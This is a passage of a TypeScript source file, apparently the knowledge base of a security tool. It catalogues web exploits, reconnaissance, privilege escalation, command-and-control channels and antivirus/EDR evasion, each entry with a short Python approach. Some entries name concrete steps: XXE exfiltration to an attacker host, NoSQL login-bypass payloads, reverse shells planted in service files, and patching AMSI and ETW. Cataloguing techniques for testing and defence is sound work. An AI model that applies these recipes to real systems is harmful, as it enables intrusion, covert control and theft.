      'Craft XML with DOCTYPE ENTITY pointing to file:///etc/passwd or http://attacker/exfil, send via requests with Content-Type: application/xml',
    libraries: ['requests', 'lxml'],
    owaspCategory: 'A05:2021-Security Misconfiguration',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-webshell',
    name: 'Python Web Shell',
    category: 'web_shell',
    description:
      'Minimal Python web shell using Flask/http.server — command execution, file browser, reverse shell trigger, encrypted communication',
    pythonApproach:
      'Flask app with OS command execution endpoint, file upload/download, obfuscated routes, authentication token, AES encrypted responses',
    libraries: ['flask', 'subprocess'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-api-abuse',
    name: 'REST API Exploitation',
    category: 'api_abuse',
    description:
      'API security testing — BOLA/IDOR enumeration, rate limit bypass, mass assignment, parameter pollution, GraphQL introspection',
    pythonApproach:
      'Iterate numeric/UUID IDs for BOLA, add extra JSON fields for mass assignment, X-Forwarded-For rotation for rate limit bypass',
    libraries: ['requests'],
    owaspCategory: 'A01:2021-Broken Access Control',
    difficulty: 'intermediate',
  })

  // Additional web exploits
  add({
    id: 'pyweb-nosqli',
    name: 'NoSQL Injection',
    category: 'sqli',
    description:
      'NoSQL injection attacks against MongoDB/CouchDB — operator injection ($gt, $ne, $regex), JavaScript injection in $where clauses, authentication bypass',
    pythonApproach:
      'requests with JSON body containing MongoDB operators ({"username": {"$ne": ""}, "password": {"$ne": ""}}), regex-based data extraction, $where JS injection',
    libraries: ['requests'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-graphql',
    name: 'GraphQL Introspection Abuse',
    category: 'api_abuse',
    description:
      'Exploit GraphQL introspection to map entire API schema — discover hidden mutations, extract sensitive fields, batch query for data exfiltration',
    pythonApproach:
      'Send __schema introspection query, parse types/fields/mutations, auto-generate queries for all types, test authorization on each field, batch nested queries',
    libraries: ['requests'],
    owaspCategory: 'A01:2021-Broken Access Control',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyweb-smuggling',
    name: 'HTTP Request Smuggling',
    category: 'rce',
    description:
      'Exploit HTTP request smuggling via CL.TE or TE.CL desync — poison web cache, bypass security controls, hijack other users requests',
    pythonApproach:
      'Raw socket to send ambiguous Content-Length/Transfer-Encoding headers, detect frontend/backend desync, craft smuggled request to poison cache or hijack sessions',
    libraries: ['socket', 'requests'],
    owaspCategory: 'A05:2021-Security Misconfiguration',
    difficulty: 'expert',
  })
  add({
    id: 'pyweb-race-condition',
    name: 'Race Condition Exploitation',
    category: 'auth_bypass',
    description:
      'Exploit TOCTOU race conditions in web apps — concurrent requests to bypass balance checks, duplicate coupon redemption, parallel account creation',
    pythonApproach:
      'asyncio/aiohttp or ThreadPoolExecutor to send many concurrent requests simultaneously, exploit time-of-check-to-time-of-use gaps in business logic',
    libraries: ['aiohttp', 'asyncio', 'concurrent.futures'],
    owaspCategory: 'A04:2021-Insecure Design',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-prototype-pollution',
    name: 'Prototype Pollution',
    category: 'rce',
    description:
      'Exploit JavaScript prototype pollution via Python payloads — inject __proto__ properties through JSON merge operations to achieve RCE or auth bypass',
    pythonApproach:
      'requests with JSON body containing {"__proto__": {"admin": true}} or {"constructor": {"prototype": {"isAdmin": true}}}, test for property injection effects',
    libraries: ['requests'],
    owaspCategory: 'A03:2021-Injection',
    difficulty: 'advanced',
  })
  add({
    id: 'pyweb-websocket-hijack',
    name: 'WebSocket Hijacking',
    category: 'auth_bypass',
    description:
      'Exploit WebSocket cross-site hijacking — abuse missing Origin validation to hijack authenticated WebSocket connections for data theft or command injection',
    pythonApproach:
      'websocket-client to connect with spoofed Origin header, capture authenticated session messages, inject commands via hijacked WebSocket connection',
    libraries: ['websocket-client', 'requests'],
    owaspCategory: 'A01:2021-Broken Access Control',
    difficulty: 'advanced',
  })

  return db
}

function buildReconTechniques(): ReconTechnique[] {
  const db: ReconTechnique[] = []
  const add = (r: ReconTechnique) => {
    db.push(r)
  }

  add({
    id: 'pyrecon-port-scan',
    name: 'Python Port Scanner',
    category: 'port_scan',
    description:
      'Multi-threaded TCP/SYN port scanner — connect scan, SYN scan with Scapy, service version detection via banner grabbing',
    pythonApproach:
      'socket.connect_ex() for TCP connect, Scapy IP()/TCP(flags="S") for SYN scan, ThreadPoolExecutor for parallelism, recv banner for service ID',
    libraries: ['socket', 'scapy', 'concurrent.futures'],
    passiveOrActive: 'active',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-osint',
    name: 'OSINT Gathering Framework',
    category: 'osint',
    description:
      'Automated OSINT collection — search engines, social media, public databases, document metadata, email patterns',
    pythonApproach:
      'requests/BeautifulSoup for web scraping, Google dorking automation, social media API querying, PDF metadata extraction with PyPDF2',
    libraries: ['requests', 'beautifulsoup4', 'tweepy'],
    passiveOrActive: 'passive',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-subdomain',
    name: 'Subdomain Enumeration',
    category: 'subdomain_enum',
    description:
      'Multi-source subdomain discovery — DNS brute force, certificate transparency, search engine scraping, zone transfer attempts',
    pythonApproach:
      'DNS brute with dnspython + wordlist, CT log API queries (crt.sh), search engine scraping, AXFR zone transfer attempt',
    libraries: ['dnspython', 'requests', 'concurrent.futures'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-dns-enum',
    name: 'DNS Enumeration',
    category: 'dns_enum',
    description:
      'Comprehensive DNS record enumeration — A, AAAA, MX, NS, TXT, SOA, CNAME, SRV, PTR records, zone transfer, DNS cache snooping',
    pythonApproach:
      'dnspython resolver.resolve() for all record types, AXFR via dns.zone.from_xfr(), reverse DNS lookups, SPF/DMARC analysis',
    libraries: ['dnspython'],
    passiveOrActive: 'active',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-webfinger',
    name: 'Web Technology Fingerprinting',
    category: 'web_fingerprint',
    description:
      'Identify web technologies, frameworks, and versions — HTTP headers, HTML patterns, JavaScript libraries, CMS detection',
    pythonApproach:
      'requests HEAD/GET, parse Server/X-Powered-By headers, match known HTML patterns (wp-content, drupal.js), detect JavaScript frameworks',
    libraries: ['requests', 'beautifulsoup4'],
    passiveOrActive: 'active',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-email-harvest',
    name: 'Email Address Harvesting',
    category: 'email_harvest',
    description:
      'Discover email addresses from websites, search engines, and public sources — build target list for phishing campaigns',
    pythonApproach:
      'Scrape company website and LinkedIn with BeautifulSoup, search engine dorking (site:target.com email), extract from WHOIS/DNS',
    libraries: ['requests', 'beautifulsoup4', 'dnspython'],
    passiveOrActive: 'passive',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-vuln-scan',
    name: 'Vulnerability Scanner',
    category: 'vuln_scan',
    description:
      'Automated vulnerability scanning — CVE database lookup, service version matching, exploit availability checking, risk scoring',
    pythonApproach:
      'python-nmap for service detection, match versions against CVE database API (NVD), check exploit-db for PoCs, generate risk report',
    libraries: ['python-nmap', 'requests'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-network-map',
    name: 'Network Topology Mapping',
    category: 'network_map',
    description:
      'Discover network topology via traceroute, ARP scanning, SNMP enumeration — build network map with device relationships',
    pythonApproach:
      'Scapy traceroute for path discovery, ARP scan for LAN devices, SNMP community string brute + OID walk, NetworkX for graph building',
    libraries: ['scapy', 'pysnmp', 'networkx'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-service-enum',
    name: 'Service Enumeration',
    category: 'service_enum',
    description:
      'Deep service enumeration — SMB shares, NFS exports, SNMP MIBs, LDAP directory, MySQL/MSSQL databases, RPC interfaces',
    pythonApproach:
      'impacket for SMB/RPC/LDAP enumeration, pysnmp for SNMP OID walking, custom scripts for database enumeration, concurrent scanning',
    libraries: ['impacket', 'pysnmp', 'ldap3'],
    passiveOrActive: 'active',
    difficulty: 'advanced',
  })
  add({
    id: 'pyrecon-social',
    name: 'Social Media Reconnaissance',
    category: 'social_recon',
    description:
      'Gather intelligence from social media — employee profiles, technology mentions, organizational structure, leaked credentials',
    pythonApproach:
      'API-based and scraping approaches for LinkedIn/Twitter/GitHub, extract job postings for tech stack, monitor paste sites for leaks',
    libraries: ['requests', 'beautifulsoup4', 'selenium'],
    passiveOrActive: 'passive',
    difficulty: 'intermediate',
  })

  // Additional recon techniques
  add({
    id: 'pyrecon-ct-logs',
    name: 'Certificate Transparency Log Mining',
    category: 'subdomain_enum',
    description:
      'Query Certificate Transparency logs (crt.sh, Google CT) to discover subdomains and internal hostnames from issued SSL certificates',
    pythonApproach:
      'Query crt.sh API (https://crt.sh/?q=%.target.com&output=json), parse results for unique subdomains, cross-reference with DNS resolution',
    libraries: ['requests', 'dnspython'],
    passiveOrActive: 'passive',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-cloud-asset',
    name: 'Cloud Asset Discovery',
    category: 'service_enum',
    description:
      'Discover cloud-hosted assets — enumerate S3 buckets, Azure blobs, GCP storage, EC2 instances via DNS patterns and keyword permutation',
    pythonApproach:
      'Generate permutations of company name for bucket names, test accessibility of s3.amazonaws.com/{name}, Azure blob endpoints, GCP storage API',
    libraries: ['requests', 'dnspython', 'concurrent.futures'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-api-enum',
    name: 'API Endpoint Enumeration',
    category: 'web_fingerprint',
    description:
      'Discover hidden API endpoints — swagger/openapi spec brute forcing, common API path fuzzing, version enumeration, GraphQL endpoint discovery',
    pythonApproach:
      'Fuzz common API paths (/api/v1/, /swagger.json, /graphql), parse OpenAPI specs for all endpoints, test HTTP methods per endpoint',
    libraries: ['requests', 'concurrent.futures'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-git-dork',
    name: 'GitHub/GitLab Dork Scanning',
    category: 'osint',
    description:
      'Search GitHub/GitLab for leaked credentials, API keys, internal URLs, and sensitive configuration in public repositories',
    pythonApproach:
      'GitHub Search API with dork queries (org:target password, org:target api_key), parse code results, extract and validate found secrets',
    libraries: ['requests', 'pygithub'],
    passiveOrActive: 'passive',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-email-harvest-adv',
    name: 'Advanced Email Harvesting',
    category: 'osint',
    description:
      'Collect email addresses from multiple sources — search engine scraping, WHOIS records, Hunter.io API, PGP key servers, corporate websites',
    pythonApproach:
      'Multi-source email collection: Google dork (@target.com), WHOIS query, Hunter.io API, PGP keyserver search, website scraping with email regex extraction',
    libraries: ['requests', 'beautifulsoup4', 'dnspython'],
    passiveOrActive: 'passive',
    difficulty: 'beginner',
  })
  add({
    id: 'pyrecon-waf-detect',
    name: 'WAF Detection and Fingerprinting',
    category: 'web_fingerprint',
    description:
      'Detect and identify Web Application Firewalls — send trigger payloads, analyze block responses, fingerprint WAF vendor by response patterns',
    pythonApproach:
      'Send known WAF trigger payloads (XSS/SQLi strings), analyze response codes and body patterns, match against WAF signature database (Cloudflare, AWS WAF, etc.)',
    libraries: ['requests'],
    passiveOrActive: 'active',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyrecon-dns-zone',
    name: 'DNS Zone Transfer Attempt',
    category: 'subdomain_enum',
    description:
      'Attempt DNS zone transfer (AXFR) against nameservers — if successful, reveals complete DNS zone including all subdomains and internal records',
    pythonApproach:
      'dnspython dns.zone.from_xfr(dns.query.xfr(nameserver, domain)) for zone transfer attempt, parse all records if successful, enumerate NS records first',
    libraries: ['dnspython'],
    passiveOrActive: 'active',
    difficulty: 'beginner',
  })

  return db
}

function buildPrivEscPaths(): PrivEscPath[] {
  const db: PrivEscPath[] = []
  const add = (p: PrivEscPath) => {
    db.push(p)
  }

  add({
    id: 'pyprivesc-suid',
    name: 'SUID Binary Exploitation',
    platform: 'linux',
    category: 'suid',
    description:
      'Find and exploit SUID binaries — GTFOBins lookup, custom SUID exploitation, shared library injection for SUID programs',
    pythonApproach:
      'os.walk("/") to find SUID files (stat.S_ISUID), match against GTFOBins database, generate exploit commands for each binary',
    prerequisites: ['local_access', 'suid_binary_present'],
    successRate: 0.6,
  })
  add({
    id: 'pyprivesc-sudo',
    name: 'Sudo Misconfiguration Abuse',
    platform: 'linux',
    category: 'sudo',
    description:
      'Exploit sudo misconfigurations — NOPASSWD entries, sudoedit, LD_PRELOAD, env_keep abuse, sudo version exploits',
    pythonApproach:
      'Parse sudo -l output, match entries against known escalation paths, check sudo version for CVEs (e.g., CVE-2021-3156 Baron Samedit)',
    prerequisites: ['local_access', 'sudo_access'],
    successRate: 0.7,
  })
  add({
    id: 'pyprivesc-kernel',
    name: 'Linux Kernel Exploit',
    platform: 'linux',
    category: 'kernel',
    description:
      'Match kernel version against known exploits — DirtyPipe, DirtyCow, OverlayFS, Netfilter exploits for root',
    pythonApproach:
      'uname -r kernel version check, match against CVE database (DirtyCow CVE-2016-5195, DirtyPipe CVE-2022-0847), download and compile exploit',
    prerequisites: ['local_access', 'vulnerable_kernel'],
    successRate: 0.5,
  })
  add({
    id: 'pyprivesc-cron',
    name: 'Cron Job Exploitation',
    platform: 'linux',
    category: 'cron',
    description:
      'Exploit writable cron jobs, PATH manipulation in cron, wildcard injection in cron-executed scripts',
    pythonApproach:
      'Parse /etc/crontab and cron.d, check file permissions with os.access(), detect wildcard usage for tar/rsync injection, monitor with pspy',
    prerequisites: ['local_access', 'writable_cron_file'],
    successRate: 0.65,
  })
  add({
    id: 'pyprivesc-caps',
    name: 'Linux Capabilities Abuse',
    platform: 'linux',
    category: 'capabilities',
    description:
      'Exploit files with elevated capabilities — CAP_SETUID on Python/Perl, CAP_DAC_READ_SEARCH for file read, CAP_NET_RAW for sniffing',
    pythonApproach:
      'Parse getcap output, match against known escalation capabilities (CAP_SETUID, CAP_DAC_OVERRIDE), generate payload for each capability',
    prerequisites: ['local_access', 'capability_present'],
    successRate: 0.55,
  })
  add({
    id: 'pyprivesc-service',
    name: 'Service Exploitation',
    platform: 'linux',
    category: 'service',
    description:
      'Exploit misconfigured services — writable service files, insecure service permissions, service binary hijacking',
    pythonApproach:
      'Enumerate systemd units, check file permissions on ExecStart paths, detect writable service configs, inject reverse shell in service file',
    prerequisites: ['local_access', 'writable_service'],
    successRate: 0.6,
  })
  add({
    id: 'pyprivesc-registry',
    name: 'Windows Registry Exploitation',
    platform: 'windows',
    category: 'registry',
    description:
      'Exploit weak registry permissions — AlwaysInstallElevated, writable service registry keys, auto-start entries',
    pythonApproach:
      'winreg module to enumerate keys, check ACLs on HKLM services, detect AlwaysInstallElevated policy, modify ImagePath for service hijack',
    prerequisites: ['local_access', 'weak_registry_acl'],
    successRate: 0.55,
  })
  add({
    id: 'pyprivesc-token',
    name: 'Windows Token Manipulation',
    platform: 'windows',
    category: 'token',
    description:
      'Token impersonation — SeImpersonatePrivilege abuse (Potato attacks), token duplication, CreateProcessWithToken for SYSTEM',
    pythonApproach:
      'ctypes OpenProcessToken/DuplicateTokenEx/CreateProcessWithTokenW, or Potato exploit for SeImpersonatePrivilege to SYSTEM',
    prerequisites: ['local_access', 'impersonate_privilege'],
    successRate: 0.7,
  })
  add({
    id: 'pyprivesc-dll',
    name: 'DLL Hijacking',
    platform: 'windows',
    category: 'dll_hijack',
    description:
      'Exploit DLL search order — place malicious DLL in application directory, service DLL hijacking, phantom DLL loading',
    pythonApproach:
      'Process Monitor analysis automation, identify missing DLLs in search path, generate malicious DLL with ctypes, place in target directory',
    prerequisites: ['local_access', 'writable_dll_path'],
    successRate: 0.65,
  })
  add({
    id: 'pyprivesc-path',
    name: 'PATH Hijacking',
    platform: 'cross_platform',
    category: 'path_hijack',
    description:
      'Exploit insecure PATH in scripts/services — create malicious binary in writable PATH directory that precedes legitimate one',
    pythonApproach:
      'Analyze target script for unqualified binary calls, find writable directory earlier in PATH, create malicious binary or symlink',
    prerequisites: ['local_access', 'writable_path_dir'],
    successRate: 0.6,
  })
  add({
    id: 'pyprivesc-unquoted',
    name: 'Unquoted Service Path',
    platform: 'windows',
    category: 'unquoted_service',
    description:
      'Exploit Windows unquoted service paths with spaces — place executable at intermediate path for privilege escalation',
    pythonApproach:
      'WMI query for services with unquoted paths containing spaces, check write permissions on intermediate directories, place payload',
    prerequisites: ['local_access', 'unquoted_service_path'],
    successRate: 0.5,
  })

  // Additional privesc paths
  add({
    id: 'pyprivesc-docker',
    name: 'Docker Container Escape',
    platform: 'linux',
    category: 'capabilities',
    description:
      'Escape Docker container to host — exploit mounted Docker socket, privileged mode, SYS_ADMIN capability, or writable host mounts',
    pythonApproach:
      'Check for /var/run/docker.sock mount, if present use docker API to create privileged container with host root mount, or exploit SYS_ADMIN cap with mount namespace',
    prerequisites: ['container_access', 'docker_socket_or_privileged'],
    successRate: 0.6,
  })
  add({
    id: 'pyprivesc-named-pipe',
    name: 'Named Pipe Impersonation',
    platform: 'windows',
    category: 'token',
    description:
      'Create named pipe server and trick privileged service into connecting — impersonate connected client token for privilege escalation',
    pythonApproach:
      'ctypes CreateNamedPipe, ConnectNamedPipe, ImpersonateNamedPipeClient, then OpenThreadToken to get SYSTEM token from connecting service',
    prerequisites: ['local_access', 'pipe_create_permission'],
    successRate: 0.55,
  })
  add({
    id: 'pyprivesc-writable-svc',
    name: 'Writable Service Binary',
    platform: 'windows',
    category: 'service',
    description:
      'Replace writable Windows service executable with malicious binary — service restart executes payload with service account privileges (often SYSTEM)',
    pythonApproach:
      'Enumerate services with sc query, check service binary ACLs with icacls via subprocess, replace binary with payload, restart service for execution',
    prerequisites: ['local_access', 'writable_service_binary'],
    successRate: 0.7,
  })
  add({
    id: 'pyprivesc-linux-caps',
    name: 'Linux Capabilities Abuse (Advanced)',
    platform: 'linux',
    category: 'capabilities',
    description:
      'Exploit advanced Linux capabilities — CAP_NET_RAW for packet manipulation, CAP_SYS_PTRACE for process injection, CAP_DAC_OVERRIDE for arbitrary file access',
    pythonApproach:
      'Enumerate binaries with capabilities via getcap, exploit CAP_SYS_PTRACE to inject shellcode into root process, CAP_DAC_OVERRIDE to overwrite /etc/shadow',
    prerequisites: ['local_access', 'capability_binary_present'],
    successRate: 0.5,
  })
  add({
    id: 'pyprivesc-potato',
    name: 'Potato Privilege Escalation (Windows)',
    platform: 'windows',
    category: 'token',
    description:
      'Windows potato attacks (Hot/Sweet/Juice/God) — abuse SeImpersonatePrivilege via NTLM relay to local DCOM/RPC for SYSTEM token impersonation',
    pythonApproach:
      'Trigger NTLM authentication from SYSTEM to attacker-controlled service, negotiate challenge/response, impersonate SYSTEM token via ImpersonateNamedPipeClient',
    prerequisites: ['local_access', 'seimpersonate_privilege'],
    successRate: 0.7,
  })
  add({
    id: 'pyprivesc-kernel-cve',
    name: 'Kernel CVE Exploitation',
    platform: 'linux',
    category: 'kernel',
    description:
      'Exploit known kernel vulnerabilities — Dirty COW, Dirty Pipe, PwnKit, OverlayFS — check kernel version and apply matching exploit',
    pythonApproach:
      'Enumerate kernel version via platform.release(), match against CVE database, download and compile matching exploit, or use Python ctypes for direct exploitation',
    prerequisites: ['local_access', 'vulnerable_kernel_version'],
    successRate: 0.8,
  })
  add({
    id: 'pyprivesc-path-hijack',
    name: 'PATH Hijacking',
    platform: 'cross_platform',
    category: 'path_hijack',
    description:
      'Exploit misconfigured PATH environment — place malicious binary in writable PATH directory that is checked before the legitimate binary location',
    pythonApproach:
      'Enumerate PATH directories, check write permissions on each, identify scripts/binaries using relative paths, place payload in writable high-priority PATH location',
    prerequisites: ['local_access', 'writable_path_directory'],
    successRate: 0.6,
  })

  return db
}

function buildC2Configs(): C2Config[] {
  const db: C2Config[] = []
  const add = (c: C2Config) => {
    db.push(c)
  }

  add({
    id: 'pyc2-http',
    name: 'HTTP/S C2 Channel',
    protocol: 'https',
    description:
      'HTTPS-based C2 using legitimate-looking web traffic — request/response model with encrypted payloads in HTTP body or headers',
    pythonApproach:
      'Flask/FastAPI server with command queue, client polls with requests, commands/results in encrypted JSON, domain fronting for stealth',
    libraries: ['flask', 'requests', 'pycryptodome'],
    stealthRating: 0.7,
    features: ['encrypted_comms', 'domain_fronting', 'jitter', 'beaconing', 'file_transfer'],
  })
  add({
    id: 'pyc2-dns',
    name: 'DNS Tunneling C2',
    protocol: 'dns',
    description:
      'Exfiltrate data and receive commands via DNS queries — encode data in subdomain labels, responses in TXT/CNAME records',
    pythonApproach:
      'dnspython for queries with base32-encoded data in subdomain labels, custom authoritative DNS server to decode and respond with commands',
    libraries: ['dnspython', 'dnslib'],
    stealthRating: 0.8,
    features: ['firewall_bypass', 'encoded_data', 'low_bandwidth', 'bidirectional'],
  })
  add({
    id: 'pyc2-icmp',
    name: 'ICMP Covert Channel',
    protocol: 'icmp',
    description:
      'Hide C2 communication in ICMP echo request/reply payload — bypass firewalls that allow ping, low detection rate',
    pythonApproach:
      'Scapy ICMP packet crafting with encrypted payload in data field, custom sequence numbers for ordering, ping-like timing pattern',
    libraries: ['scapy', 'pycryptodome'],
    stealthRating: 0.85,
    features: ['firewall_bypass', 'encrypted_payload', 'low_profile', 'ping_mimicry'],
  })
  add({
    id: 'pyc2-websocket',
    name: 'WebSocket C2',
    protocol: 'websocket',
    description:
      'Full-duplex C2 over WebSocket — real-time bidirectional communication disguised as legitimate web app traffic',
    pythonApproach:
      'websockets library for async bidirectional channel, JSON command/response protocol, TLS encryption, reconnection with backoff',
    libraries: ['websockets', 'asyncio'],
    stealthRating: 0.7,
    features: ['full_duplex', 'real_time', 'tls_encrypted', 'reconnection'],
  })
  add({
    id: 'pyc2-smtp',
    name: 'Email-Based C2',
    protocol: 'smtp',
    description:
      'C2 over email — commands sent as emails to dead-drop accounts, results exfiltrated as attachments or encoded email bodies',
    pythonApproach:
      'smtplib/imaplib for send/receive, commands in email body with encoding, results as encrypted attachments, multiple dead-drop accounts',
    libraries: ['smtplib', 'imaplib', 'email'],
    stealthRating: 0.75,
    features: ['asynchronous', 'dead_drop', 'encrypted_attachments', 'legitimate_traffic'],
  })
  add({
    id: 'pyc2-p2p',
    name: 'Peer-to-Peer C2',
    protocol: 'p2p',
    description:
      'Decentralized P2P mesh C2 — no single point of failure, DHT-based peer discovery, encrypted inter-node communication',
    pythonApproach:
      'Custom P2P protocol with node discovery, Kademlia DHT for peer finding, encrypted tunnels between nodes, command propagation via gossip',
    libraries: ['socket', 'threading', 'pycryptodome'],
    stealthRating: 0.8,
    features: ['decentralized', 'resilient', 'no_single_point_failure', 'mesh_network'],
  })
  add({
    id: 'pyc2-cloud',
    name: 'Cloud Service C2',
    protocol: 'cloud_api',
    description:
      'Abuse cloud storage/messaging services as C2 infrastructure — Dropbox, Google Drive, Slack, Telegram API for command delivery',
    pythonApproach:
      'Cloud provider API (dropbox, google-api-python-client, slack_sdk, python-telegram-bot) for file-based command/response, encrypted blobs',
    libraries: ['requests', 'dropbox'],
    stealthRating: 0.85,
    features: ['cloud_infrastructure', 'legitimate_domains', 'encrypted_storage', 'api_abuse'],
  })
  add({
    id: 'pyc2-social',
    name: 'Social Media C2',
    protocol: 'social_media',
    description:
      'Use social media platforms as C2 channels — encoded commands in posts/comments, image steganography for data transfer',
    pythonApproach:
      'Platform API or scraping for command delivery in posts, steganography in images for data exfiltration, dead-drop comment threads',
    libraries: ['requests', 'pillow', 'beautifulsoup4'],
    stealthRating: 0.8,
    features: ['social_media_blend', 'steganography', 'dead_drop', 'high_availability'],
  })
  add({
    id: 'pyc2-custom-tcp',
    name: 'Custom Encrypted TCP C2',
    protocol: 'custom_tcp',
    description:
      'Raw TCP C2 with custom protocol — length-prefixed messages, AES-GCM encryption, certificate pinning, multiplexed channels',
    pythonApproach:
      'socket + ssl with custom protocol header (magic + length + encrypted payload), AES-GCM authenticated encryption, asyncio for multiplexing',
    libraries: ['socket', 'ssl', 'pycryptodome', 'asyncio'],
    stealthRating: 0.5,
    features: ['custom_protocol', 'aes_gcm', 'cert_pinning', 'multiplexing'],
  })

  // Additional C2 configs
  add({
    id: 'pyc2-blockchain',
    name: 'Blockchain-Based C2',
    protocol: 'custom_tcp',
    description:
      'Use blockchain transactions as C2 channel — embed commands in transaction metadata (OP_RETURN), agents poll blockchain for instructions',
    pythonApproach:
      'bitcoin/web3 library to monitor blockchain for transactions with specific markers in OP_RETURN data, decode commands from transaction metadata, respond via new transactions',
    libraries: ['web3', 'requests', 'pycryptodome'],
    stealthRating: 0.9,
    features: ['blockchain_comms', 'immutable_commands', 'decentralized', 'censorship_resistant'],
  })
  add({
    id: 'pyc2-stego',
    name: 'Steganography C2',
    protocol: 'https',
    description:
      'Hide C2 commands in images posted to public platforms — LSB steganography in uploaded images, agents monitor image feed for encoded instructions',
    pythonApproach:
      'Pillow for LSB encoding of commands into images, upload to public image hosting, agents periodically check feed and extract hidden data from image pixels',
    libraries: ['pillow', 'requests', 'pycryptodome'],
    stealthRating: 0.9,
    features: [
      'steganography',
      'public_platform_abuse',
      'visual_covert_channel',
      'encrypted_payload',
    ],
  })
  add({
    id: 'pyc2-domain-front',
    name: 'Domain Fronting C2',
    protocol: 'https',
    description:
      'Abuse CDN domain fronting to hide C2 traffic behind legitimate domains — SNI shows CDN, Host header routes to attacker backend',
    pythonApproach:
      'requests with TLS SNI set to legitimate CDN domain (e.g., cdn.example.com), HTTP Host header set to attacker backend, CDN forwards based on Host header',
    libraries: ['requests', 'pycryptodome'],
    stealthRating: 0.85,
    features: ['domain_fronting', 'cdn_abuse', 'legitimate_sni', 'traffic_blending'],
  })
  add({
    id: 'pyc2-slack-c2',
    name: 'Slack/Teams API C2',
    protocol: 'https',
    description:
      'Abuse Slack or Microsoft Teams API as C2 channel — post commands as messages, agents poll channels for tasks, results posted back as replies',
    pythonApproach:
      'Slack/Teams webhook API via requests for command posting, agents poll channel messages via API token, parse JSON for task instructions, post results as thread replies',
    libraries: ['requests', 'slack-sdk'],
    stealthRating: 0.8,
    features: ['collaboration_tool_abuse', 'legitimate_traffic', 'encrypted_tls', 'api_based'],
  })
  add({
    id: 'pyc2-websocket-c2',
    name: 'WebSocket Persistent C2',
    protocol: 'websocket',
    description:
      'WebSocket-based C2 for persistent bidirectional communication — low latency command delivery, real-time data streaming, proxy-friendly',
    pythonApproach:
      'websocket-server for C2 server, websocket-client for agent, persistent connection with JSON command/response protocol, automatic reconnection with exponential backoff',
    libraries: ['websocket-client', 'pycryptodome'],
    stealthRating: 0.6,
    features: ['persistent_connection', 'bidirectional', 'low_latency', 'proxy_support'],
  })

  return db
}

function buildEvasionMethods(): EvasionMethod[] {
  const db: EvasionMethod[] = []
  const add = (e: EvasionMethod) => {
    db.push(e)
  }

  add({
    id: 'pyev-av-bypass',
    name: 'AV Signature Bypass',
    category: 'av_bypass',
    description:
      'Bypass antivirus signature detection — XOR encoding, AES encryption of payload, custom packers, string obfuscation',
    pythonApproach:
      'XOR encode shellcode with random key, AES encrypt payload with runtime decryption stub, replace string literals with chr() concatenation',
    targetDefense: 'Antivirus (Signature-based)',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-edr-bypass',
    name: 'EDR Evasion Techniques',
    category: 'edr_bypass',
    description:
      'Bypass EDR solutions — direct syscalls, unhooking ntdll, ETW patching, PPID spoofing, process hollowing from Python',
    pythonApproach:
      'ctypes for direct syscall invocation (NtAllocateVirtualMemory), unhook ntdll by loading fresh copy from disk, patch ETW provider',
    targetDefense: 'Endpoint Detection & Response',
    effectiveness: 0.6,
  })
  add({
    id: 'pyev-sandbox',
    name: 'Sandbox Detection & Evasion',
    category: 'sandbox_detect',
    description:
      'Detect analysis sandboxes — check CPU count, RAM size, disk size, mouse movement, recent files, sleep timing analysis',
    pythonApproach:
      'os.cpu_count() < 2, psutil.virtual_memory().total < 4GB, check for VM artifacts (vmtoolsd, VBoxService), GetCursorPos delta check',
    targetDefense: 'Sandbox/VM Analysis',
    effectiveness: 0.75,
  })
  add({
    id: 'pyev-amsi',
    name: 'AMSI Bypass',
    category: 'amsi_bypass',
    description:
      'Bypass Windows Antimalware Scan Interface — patch AmsiScanBuffer in memory, amsi.dll unhooking, reflection-based bypass',
    pythonApproach:
      'ctypes to locate amsi.dll!AmsiScanBuffer, patch first bytes with ret instruction (0xC3), or VirtualProtect + WriteProcessMemory approach',
    targetDefense: 'AMSI (Windows)',
    effectiveness: 0.65,
  })
  add({
    id: 'pyev-etw',
    name: 'ETW Patching',
    category: 'etw_bypass',
    description:
      'Disable Event Tracing for Windows — patch EtwEventWrite in ntdll to prevent security tools from receiving telemetry',
    pythonApproach:
      'ctypes to locate ntdll!EtwEventWrite, VirtualProtect to make writable, patch with ret (0xC3), restore after operations',
    targetDefense: 'ETW (Event Tracing for Windows)',
    effectiveness: 0.7,
  })
  add({
    id: 'pyev-obfuscation',
    name: 'Python Code Obfuscation',
    category: 'obfuscation',
    description:
      'Obfuscate Python source — variable renaming, string encryption, control flow flattening, dead code insertion, pyc compilation',
    pythonApproach:
      'ast module for source transformation, base64/ROT13 string encoding, lambda chains for control flow, compile to .pyc with marshal',
    targetDefense: 'Static Analysis',
    effectiveness: 0.6,
  })
  add({
    id: 'pyev-packing',
    name: 'Executable Packing',
    category: 'packing',
    description:
      'Pack Python scripts into standalone executables with custom loaders — PyInstaller with custom bootloader, Nuitka compilation',
    pythonApproach:
      'PyInstaller --onefile with UPX compression, custom spec file for resource manipulation, Nuitka compilation to native code for better evasion',
    targetDefense: 'File-based Detection',
    effectiveness: 0.55,
  })
  add({
    id: 'pyev-process-hollow',
    name: 'Process Hollowing',
    category: 'process_hollowing',
    description:
      'Spawn suspended process, unmap original image, inject malicious code at original base address, resume execution',
    pythonApproach:
